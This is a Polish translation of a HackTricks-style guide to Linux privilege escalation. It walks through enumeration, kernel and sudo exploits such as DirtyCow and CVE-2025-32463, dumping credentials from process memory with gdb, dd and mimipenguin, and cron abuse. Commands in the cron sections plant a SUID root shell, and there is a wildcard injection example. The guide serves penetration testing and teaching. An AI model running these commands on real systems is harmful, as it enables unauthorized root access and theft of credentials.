# Eskalacja uprawnień w systemie Linux

{{#include ../../../banners/hacktricks-training.md}}

Aby uzyskać szerszy kontekst oraz poznać historyczne metody enumeracji, zapoznaj się z materiałami g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation i linux-private-i wymienionymi w referencjach.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy od zebrania informacji o uruchomionym systemie operacyjnym.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Ścieżka

Jeśli masz **uprawnienia do zapisu w dowolnym folderze ze zmiennej `PATH`**, możesz przejąć niektóre biblioteki lub pliki binarne:

```bash
echo $PATH
```

### Informacje o środowisku

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub klucze API?

```bash
(env || set) 2>/dev/null
```

### Exploity jądra

Sprawdź wersję jądra i ustal, czy istnieje exploit, którego można użyć do eskalacji uprawnień.

W [sekcji Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) zebrano przypadki lokalnej eskalacji uprawnień oraz linki do bardziej szczegółowych opracowań dotyczących jądra Linux w Binary Exploitation. Przed przetestowaniem danego przypadku sprawdź, czy dotyczy on używanej kompilacji i konfiguracji.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Dobrą listę podatnych jąder i kilka już **compiled exploits** znajdziesz tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) oraz [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Inne strony, na których znajdziesz **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić z tej strony wszystkie podatne wersje jądra, możesz wykonać:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Narzędzia, które mogą pomóc w wyszukiwaniu kernel exploitów:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchom na ofierze, sprawdza exploity tylko dla kernela 2.x)

Zawsze **wyszukaj wersję kernela w Google** — być może Twoja wersja kernela jest wymieniona w opisie któregoś kernel exploita, co pozwoli Ci upewnić się, że exploit jest odpowiedni.

Dodatkowe techniki wykorzystujące kernel:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Eskalacja uprawnień w systemie Linux — Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Wersja sudo

Na podstawie podatnych wersji sudo wymienionych w:

```bash
searchsploit sudo
```

Możesz sprawdzić, czy wersja sudo jest podatna, używając tego polecenia grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Wersje sudo **1.9.14–1.9.17** z projektu nadrzędnego pozwalają nieuprzywilejowanym użytkownikom lokalnym uzyskać uprawnienia roota za pomocą opcji `--chroot`, gdy sudo wczytuje `/etc/nsswitch.conf` z katalogu kontrolowanego przez użytkownika; projekt nadrzędny naprawił ten problem w wersji **1.9.17p1**. Sprawdź każdy plik binarny sudo z ustawionym setuid roota w odpowiednich ścieżkach, ponieważ `sudo -V` wyświetla informacje tylko o pliku binarnym wybranym przez `PATH`. Pakiety dystrybucji mogą zawierać poprawkę wsteczną bez zmiany numeru wersji z projektu nadrzędnego, dlatego sprawdź też status pakietu dostawcy. Zobacz [komunikat opiekuna sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Oto [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) wykorzystujący tę [podatność](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Przed uruchomieniem exploita upewnij się, że Twoja wersja `sudo` jest podatna i obsługuje funkcję `chroot`.

Więcej informacji znajdziesz w oryginalnym [komunikacie o podatności](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Obejście reguł sudo opartych na hoście (CVE-2025-32462)

Wersje sudo **1.8.8–1.9.17** z projektu nadrzędnego mogą sprawdzać reguły sudoers oparte na hoście, używając **nazwy hosta podanej przez użytkownika** w `sudo -h <host>` zamiast **rzeczywistej nazwy hosta**; projekt nadrzędny naprawił ten problem w wersji **1.9.17p1**. Użytkownik nadal musi mieć pasujący wpis sudoers dla wybranego hosta. Sprawdź poprawki wsteczne dostawcy i alternatywne pliki binarne sudo, a także lokalne zasady. Zobacz [komunikat opiekuna sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Wymagania:
- Podatna wersja sudo
- Reguły sudoers dotyczące konkretnego hosta (host nie jest ani bieżącą nazwą hosta, ani `ALL`)

Przykładowy wzorzec sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit przez spoofing dozwolonego hosta:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Jeśli rozwiązanie wybranej nazwy blokuje działanie, sprawdź, jak ta nazwa jest rozwiązywana na hoście. Sama obecność nazwy w logu lub pliku konfiguracyjnym nie oznacza, że można ją rozwiązać, a modyfikacja `/etc/hosts` zwykle wymaga uprzywilejowanego dostępu do zapisu.

#### sudo < v1.8.28

Ten [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) wymaga skutecznej reguły sudo zezwalającej na uruchomienie polecenia jako użytkownik `ALL`, z wyłączeniem roota, na przykład `(ALL, !root) /bin/bash`. Wywołujący musi też mieć prawo do użycia tej reguły, z uwzględnieniem ewentualnego wymogu uwierzytelnienia. Sprawdź zalecenia dotyczące zainstalowanego pakietu: dostawcy przenieśli poprawkę do wydań, których wyświetlana wersja upstream nadal jest niższa niż 1.8.28. Sama reguła `!root` lub stara wersja nie potwierdza podatności. Podczas pasywnego rozpoznania nie testuj uprzywilejowanego polecenia.

```
sudo -u#-1 /bin/bash
```

### Weryfikacja sygnatury Dmesg nie powiodła się

Sprawdź **maszynę smasher2 z HTB**, aby zobaczyć **przykład** wykorzystania tej podatności.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Dalsze rozpoznanie systemu

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Enumeruj możliwe mechanizmy obronne

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Jeśli jesteś wewnątrz kontenera, zacznij od poniższej sekcji dotyczącej bezpieczeństwa kontenerów, a następnie przejdź do stron opisujących nadużycia specyficzne dla danego środowiska uruchomieniowego:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Dyski

Sprawdź, **co jest zamontowane, a co nie**, gdzie i dlaczego. Jeśli coś nie jest zamontowane, możesz spróbować to zamontować i sprawdzić, czy zawiera prywatne informacje.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Przydatne oprogramowanie

Wymień przydatne pliki wykonywalne

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Sprawdź również, czy **zainstalowany jest jakikolwiek kompilator**. Przyda się to, jeśli musisz użyć exploita kernela, ponieważ zaleca się skompilowanie go na maszynie, na której zamierzasz go użyć (lub na podobnej).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Zainstalowane podatne oprogramowanie

Sprawdź **wersje zainstalowanych pakietów i usług**. Być może jest zainstalowana stara wersja Nagiosa (na przykład), którą można wykorzystać do eskalacji uprawnień…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Jeśli masz dostęp SSH do maszyny, możesz też użyć **openVAS**, aby sprawdzić, czy zainstalowane na niej oprogramowanie jest nieaktualne lub podatne na ataki.

> [!NOTE] > _Pamiętaj, że te polecenia wyświetlą wiele informacji, z których większość będzie bezużyteczna. Dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy którakolwiek z zainstalowanych wersji oprogramowania jest podatna na znane exploity_

## Procesy

Sprawdź, **jakie procesy** są uruchomione i czy któryś z nich ma **większe uprawnienia, niż powinien** (na przykład Tomcat uruchomiony przez root?).

```bash
ps aux
ps -ef
top -n 1
```

Zawsze sprawdzaj, czy nie działają [**debuggery electron/cef/chromium** — możesz je wykorzystać do eskalacji uprawnień](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w wierszu poleceń procesu.\
Sprawdź też, **czy masz uprawnienia do plików binarnych procesów** — być może możesz nadpisać któryś z nich.

### Łańcuchy procesów nadrzędnych i podrzędnych między użytkownikami

Proces podrzędny uruchomiony przez **innego użytkownika** niż jego proces nadrzędny nie jest automatycznie złośliwy, ale stanowi przydatny **sygnał do wstępnej analizy**. Niektóre takie przejścia są spodziewane (`root` uruchamiający konto usługi, menedżery logowania tworzące procesy sesji), ale nietypowe łańcuchy mogą ujawnić wrappery, pomocnicze narzędzia debugowania, mechanizmy utrwalania dostępu lub słabe granice zaufania środowiska uruchomieniowego.

Szybki przegląd:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Jeśli znajdziesz zaskakujący łańcuch, sprawdź wiersz poleceń procesu nadrzędnego i wszystkie pliki wpływające na jego działanie (`config`, `EnvironmentFile`, skrypty pomocnicze, katalog roboczy, zapisywalne argumenty). W kilku rzeczywistych ścieżkach privesc plik procesu potomnego nie był zapisywalny, ale **konfiguracja kontrolowana przez proces nadrzędny** lub łańcuch skryptów pomocniczych już tak.

### Usunięte pliki wykonywalne i usunięte, ale otwarte pliki

Artefakty środowiska uruchomieniowego są często nadal dostępne **po usunięciu**. Przydaje się to zarówno do eskalacji uprawnień, jak i odzyskiwania dowodów z procesu, który ma już otwarte wrażliwe pliki.

Sprawdź usunięte pliki wykonywalne:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Jeśli `/proc/<PID>/exe` wskazuje na `(deleted)`, proces nadal uruchamia stary obraz binarny z pamięci. To mocny sygnał, że warto to zbadać, ponieważ:

- usunięty plik wykonywalny może zawierać interesujące ciągi znaków lub dane uwierzytelniające
- działający proces może nadal udostępniać przydatne deskryptory plików
- usunięty plik binarny z uprawnieniami może wskazywać na niedawne manipulacje lub próbę zatarcia śladów

Zbierz globalnie pliki, które zostały usunięte, ale nadal są otwarte:

```bash
lsof +L1
```

Jeśli znajdziesz interesujący deskryptor, odzyskaj go bezpośrednio:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Jest to szczególnie przydatne, gdy proces nadal ma otwarty usunięty sekret, skrypt, eksport bazy danych lub plik z flagą.

### Monitorowanie procesów

Do monitorowania procesów możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy). Może to być bardzo przydatne do identyfikowania podatnych procesów, które są uruchamiane często lub po spełnieniu określonych warunków.

#### Linux ProcMon przez sudo

[ProcMon dla Linux](https://github.com/microsoft/ProcMon-for-Linux) może śledzić wybrane procesy i wywołania systemowe oraz zapisywać ślad SQLite. Jeśli `sudo -l` zezwala na nieograniczone uruchamianie polecenia `procmon` z uprawnieniami roota, sprawdź, czy może ono obserwować dane wejściowe lub wyjściowe procesu innego użytkownika. To uprawnienie jest jedynie wskazówką do dalszej analizy: znaczenie mają obsługa śledzenia, obowiązujące zasady oraz aktywność odpowiedniego procesu. Pliki śladów mogą zawierać sekrety, dlatego dokładnie sprawdzaj autoryzowane eksporty i unikaj zbierania danych z niepowiązanych procesów.

### Pamięć procesów

Niektóre usługi serwera zapisują **poświadczenia w pamięci jawnym tekstem**.\
Zwykle do odczytania pamięci procesów należących do innych użytkowników potrzebne są **uprawnienia roota**, dlatego jest to zazwyczaj bardziej przydatne, gdy masz już roota i chcesz znaleźć więcej poświadczeń.\
Pamiętaj jednak, że **jako zwykły użytkownik możesz odczytać pamięć procesów, które należą do Ciebie**.

> [!WARNING]
> Pamiętaj, że obecnie większość maszyn **domyślnie nie zezwala na ptrace**, co oznacza, że nie możesz zrzucać pamięci innych procesów należących do nieuprzywilejowanego użytkownika.
>
> Plik _**/proc/sys/kernel/yama/ptrace_scope**_ określa dostępność ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: można debugować wszystkie procesy, o ile mają ten sam uid. Tak działało ptrace tradycyjnie.
> - **kernel.yama.ptrace_scope = 1**: można debugować tylko procesy potomne.
> - **kernel.yama.ptrace_scope = 2**: ptrace może używać tylko administrator, ponieważ wymaga to uprawnienia CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: nie można śledzić żadnych procesów za pomocą ptrace. Po ustawieniu tej wartości do ponownego włączenia ptrace wymagany jest restart.

Proces działający z tym samym UID, który na krótko odblokowuje sejf z hasłami, może stanowić odrębną granicę bezpieczeństwa poświadczeń. Gdy śledzenie jest dozwolone, aktywny proces z możliwością zrzutu pamięci może ujawnić hasło do sejfu przez swoje wywołania systemowe związane z danymi wejściowymi lub pamięć, nawet jeśli sam zaszyfrowany plik sejfu pozostaje chroniony. `ptrace_scope=0` jest tylko jednym z warunków wstępnych: znaczenie mają również zgodność poświadczeń, możliwość zrzutu pamięci procesu docelowego, inne moduły bezpieczeństwa Linux oraz czas działania procesu. Użycie wpisu z sejfu do logowania na konto Unix root wymaga osobnego sprawdzenia ponownego użycia poświadczeń. Rutynowe rozpoznanie powinno wskazywać politykę oraz kandydujący proces lub ścieżki do sejfu, a nie przechwytywać danych wejściowych ani wyświetlać sekretów. Zobacz [dokumentację Yama w jądrze](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) i [kontrole dostępu ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz pobrać Heap i przeszukać go pod kątem poświadczeń.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Skrypt GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu **maps pokazuje, jak pamięć jest mapowana w przestrzeni adresów wirtualnych tego procesu**; pokazuje również **uprawnienia każdego mapowanego obszaru**. Plik pseudo **mem udostępnia samą pamięć procesu**. Z pliku **maps** wiemy, które **obszary pamięci można odczytać** oraz jakie są ich przesunięcia. Korzystamy z tych informacji, aby **ustawić pozycję w pliku mem i zrzucić wszystkie czytelne obszary** do pliku.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` zapewnia dostęp do **pamięci fizycznej** systemu, a nie do pamięci wirtualnej. Do przestrzeni adresowej wirtualnej jądra można uzyskać dostęp za pomocą /dev/kmem.\
Zazwyczaj odczyt `/dev/mem` jest dostępny tylko dla **root** i grupy **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump dla Linuxa

ProcDump to linuksowa wersja klasycznego narzędzia ProcDump z pakietu Sysinternals dla systemu Windows. Pobierz je z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Narzędzia

Aby zrzucić pamięć procesu, możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania dotyczące root i zrzucić pamięć procesu należącego do Ciebie
- Skrypt A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany root)

### Dane uwierzytelniające z pamięci procesu

#### Przykład ręczny

Jeśli znajdziesz uruchomiony proces uwierzytelniający:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Możesz zrzucić pamięć procesu (zobacz wcześniejsze sekcje, aby poznać różne sposoby zrzucania pamięci procesu) i wyszukać w niej dane uwierzytelniające:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **kradnie poświadczenia zapisane jawnym tekstem z pamięci** oraz z niektórych **powszechnie znanych plików**. Do prawidłowego działania wymaga uprawnień root.

| Funkcja                                           | Nazwa procesu        |
| ------------------------------------------------- | -------------------- |
| Hasło GDM (Kali Desktop, Debian Desktop)          | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktywne połączenia FTP)                   | vsftpd               |
| Apache2 (aktywne sesje HTTP Basic Auth)           | apache2              |
| OpenSSH (aktywne sesje SSH — użycie Sudo)         | sshd:                |

#### Wyszukiwane wyrażenia regularne/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Zadania zaplanowane/Cron

### Crontab UI (alseambusher) działający jako root – eskalacja uprawnień przez scheduler oparty na WWW

Jeśli panel WWW „Crontab UI” (alseambusher/crontab-ui) działa jako root i jest powiązany tylko z loopbackiem, nadal możesz uzyskać do niego dostęp przez lokalne przekierowanie portu SSH i utworzyć uprzywilejowane zadanie, aby eskalować uprawnienia.<sup>[[1]](#references)[[4]](#references)</sup>

Typowy łańcuch
- Wykryj port dostępny tylko przez loopback (np. 127.0.0.1:8000) i realm Basic-Auth za pomocą `ss -ntlp` / `curl -v localhost:8000`
- Znajdź dane logowania w artefaktach operacyjnych:
  - Kopie zapasowe/skrypty zawierające `zip -P <password>`
  - Jednostka systemd ujawniająca `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Utwórz tunel i zaloguj się:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie z wysokimi uprawnieniami i uruchom je natychmiast (tworzy powłokę SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```

Hardening
- Nie uruchamiaj Crontab UI jako root; użyj dedykowanego użytkownika i minimalnych uprawnień
- Powiąż usługę z localhost i dodatkowo ogranicz dostęp za pomocą firewalla/VPN; nie używaj ponownie haseł
- Unikaj umieszczania sekretów w plikach jednostek; korzystaj z magazynów sekretów lub plików EnvironmentFile dostępnych wyłącznie dla roota
- Włącz audytowanie/logowanie uruchomień zadań na żądanie

Sprawdź, czy jakieś zaplanowane zadanie jest podatne na ataki. Może da się wykorzystać skrypt uruchamiany przez roota (podatność wildcard? Można zmodyfikować pliki używane przez roota? Użyć dowiązań symbolicznych? Utworzyć w katalogu używanym przez roota określone pliki?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Jeśli używane jest `run-parts`, sprawdź, które nazwy zostaną faktycznie uruchomione:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Pozwala to uniknąć fałszywych alarmów. Zapisywalny katalog okresowy jest przydatny tylko wtedy, gdy nazwa pliku payloadu spełnia lokalne reguły `run-parts`.

### Ścieżka Cron

Na przykład w pliku _/etc/crontab_ można znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zwróć uwagę, że użytkownik „user” ma uprawnienia do zapisu w katalogu /home/user_)

Jeśli w tym crontabie użytkownik root spróbuje wykonać jakieś polecenie lub skrypt bez ustawiania ścieżki, na przykład: _\* \* \* \* root overwrite.sh_\
Możesz wtedy uzyskać powłokę roota, używając:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron uruchamiający skrypt z symbolem wieloznacznym (Wildcard Injection)

Jeśli skrypt uruchamiany przez roota zawiera w poleceniu „**\***”, możesz to wykorzystać, aby wywołać nieoczekiwane efekty (np. privesc). Przykład:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Jeśli przed wildcardem znajduje się ścieżka, np.** _**/some/path/\***_ **, nie jest podatny na atak (nawet** _**./\***_ **nie jest).**

Przeczytaj poniższą stronę, aby poznać więcej trików związanych z wildcardami:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Wstrzyknięcie w rozszerzeniu arytmetycznym Bash w parserach logów cron

Bash może interpretować niezaufany tekst jako wyrażenie arytmetyczne. W niektórych kontekstach Bash indeks tablicy wewnątrz takiego wyrażenia może wykonać podstawienie polecenia. Jeśli uprzywilejowany parser/cron umieści kontrolowany przez atakującego tekst z logu w takim porównaniu arytmetycznym, podstawienie może zostać wykonane z uprawnieniami parsera.<sup>[[22]](#references)</sup> Zależy to od konkretnego wyrażenia Bash i wersji; sam ciąg `$(...)0` w rozwiniętej zmiennej nie jest wiarygodnym przykładem ponownej ewaluacji.

Dane wejściowe mogą również pochodzić z metadanych pliku lub innego pola odczytywanego z lokalizacji zapisywalnej przez użytkownika. Na przykład uprzywilejowany skrypt czyszczący, który odczytuje tag `Producer` obrazu i porównuje go za pomocą `[[ "$producer" -eq "expected" ]]`, wykonuje porównanie arytmetyczne, mimo że zmienna jest ujęta w cudzysłowy. Ustal, z jaką tożsamością działa zaplanowane zadanie, które pliki mogą dostarczyć tag, jakie przekształcenia są wykonywane przed porównaniem oraz jakie dokładnie jest zachowanie Bash. W przypadku etykiet tekstowych używaj porównania ciągów znaków; w przypadku liczb przed obliczeniami arytmetycznymi sprawdź, czy dane wejściowe zawierają wyłącznie cyfry dziesiętne. Zobacz [zasady arytmetyczne Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Typowy podatny wzorzec:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Bezpieczna lokalna sonda zachowania mechanizmu indeksowania tablicy (bez procesu uprzywilejowanego ani zmiany pliku):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Prześledź rzeczywisty zaplanowany skrypt i literalną ścieżkę wejściową, którą otwiera. Nawet jeśli sam plik logu nie jest zapisywalny, użytkownik, który może zapisywać w jego katalogu nadrzędnym, który nie ma sticky bitu, i przechodzić przez niego, może być w stanie podmienić wpis katalogowy; `namei -l` pomaga rozróżnić te uprawnienia. Inna zapisywalna ścieżka logu, nieczytelny scheduler albo parser, który nie interpretuje tego pola jako arytmetyki Bash, nie potwierdzają istnienia tej ścieżki.

### Nadpisywanie skryptu Cron i symlink

Jeśli **możesz modyfikować skrypt cron** wykonywany przez roota, możesz bardzo łatwo uzyskać shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Jeśli skrypt uruchamiany przez roota używa **katalogu, do którego masz pełny dostęp**, być może warto usunąć ten katalog i **utworzyć dowiązanie symboliczne do innego katalogu**, zawierającego skrypt kontrolowany przez Ciebie.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Walidacja symlinków i bezpieczniejsza obsługa plików

Podczas przeglądu uprzywilejowanych skryptów/plików binarnych, które odczytują lub zapisują pliki według ścieżki, sprawdź, jak obsługiwane są dowiązania:

- `stat()` podąża za symlinkem i zwraca metadane celu.
- `lstat()` zwraca metadane samego dowiązania.
- `readlink -f` i `namei -l` pomagają ustalić ścieżkę do celu i sprawdzić uprawnienia każdego elementu ścieżki.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Dla obrońców i deweloperów bezpieczniejsze wzorce chroniące przed sztuczkami z symlinkami obejmują:

- `O_EXCL` z `O_CREAT`: zakończenie niepowodzeniem, jeśli ścieżka już istnieje (blokuje wcześniej utworzone przez atakującego linki/pliki).
- `openat()`: operowanie względem deskryptora pliku zaufanego katalogu.
- `mkstemp()`: atomowe tworzenie plików tymczasowych z bezpiecznymi uprawnieniami.

### Niestandardowe binarki cron z zapisywalnymi payloadami
Zwykły użytkownik, który może zapisywać dokładnie tę binarkę, którą uruchamia zadanie cron działające jako root, może przekroczyć granicę uprawnień, ale niestandardowe sprawdzanie podpisu może odrzucić niepodpisaną podmianę. W udokumentowanym przypadku plik ELF należący do roota miał tryb `0760`, co pozwalało członkowi jego grupy go modyfikować, a właścicielowi root — uruchamiać. Widoczny ślad procesów pokazał, że `objcopy` wyodrębniało `.text_sig` przed uruchomieniem binarki przez zadanie; pełny skrypt weryfikujący nie był czytelny.<sup>[[2]](#references)</sup>

